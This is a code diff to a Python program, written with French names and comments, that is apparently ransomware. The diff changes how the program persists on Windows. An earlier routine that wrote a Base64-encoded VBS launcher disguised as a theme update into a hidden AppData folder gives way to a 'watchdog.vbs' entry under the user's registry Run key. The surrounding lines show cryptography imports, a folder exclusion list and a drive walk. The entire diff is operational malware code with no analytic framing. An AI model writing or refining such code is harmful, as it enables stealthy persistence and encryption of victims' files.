@@ -7,7 +7,6 @@ from cryptography.hazmat.backends import default_backend
 import multiprocessing
 import winreg
 import subprocess
-import secrets
 from queue import Empty
 import time
 import random
@@ -72,7 +71,7 @@ folders_exclus = [
     "local",
     "microsoft",
     "programdata",
-    ".vscode"
+    ".vscode",
     "ransomware"
 ]
 
@@ -168,42 +167,23 @@ def is_watchdog_running(watchdog_vbs_path):
             continue
     return False
 
-def ajouter_run_key_vbs_relatif():
+def ajouter_run_key_watchdog():
     hidden_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes")
     os.makedirs(hidden_dir, exist_ok=True)
 
-    nom_valeur = "MonScriptAuto"
+    nom_valeur = "WatchdogAuto"
+    chemin_watchdog_vbs = os.path.join(hidden_dir, "watchdog.vbs")
 
-    # Chemin relatif vers le script à exécuter (ici .py, mais tu peux mettre .exe ou .bat)
-    current_dir = os.path.dirname(os.path.realpath(__file__))
-    chemin_script_python = os.path.join(current_dir, "encoder.py")
-
-    # Contenu du VBS (avec chemin relatif)
-    vbs_template = f'''
-Set WshShell = CreateObject("WScript.Shell")
-WshShell.Run "pythonw.exe {chemin_script_python}", 0, False
-'''
-
-    # Encoder en Base64
-    b64_vbs = base64.b64encode(vbs_template.encode()).decode()
-
-    # Créer le fichier VBS à côté du script actuel
-    chemin_script = os.path.join(hidden_dir, "theme_update.vbs")
-
-    # Écrire le fichier VBS en le décodant depuis Base64
-    with open(chemin_script, "w", encoding="utf-8") as f:
-        f.write(base64.b64decode(b64_vbs).decode())
-
-    # Ajouter au registre (Run key)
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r"Software\Microsoft\Windows\CurrentVersion\Run",
                              0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
+        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_watchdog_vbs)
         winreg.CloseKey(key)
-        print("Clé Run ajoutée avec succès.")
+        print("Clé Run watchdog ajoutée avec succès.")
     except Exception as e:
-        print(f"Erreur lors de l'ajout dans le registre : {e}")
+        print(f"Erreur lors de l'ajout watchdog dans le registre : {e}")
+
 
 def is_in_excluded_folder(file_path: Path):
     try:
@@ -326,7 +306,7 @@ def main():
     if existDir.lower() not in folders_exclus:
         folders_exclus.append(existDir.lower())
 
-    ajouter_run_key_vbs_relatif()
+    ajouter_run_key_watchdog()
     create_watchdog_vbs()
 
     lecteurs = get_existing_root_path()
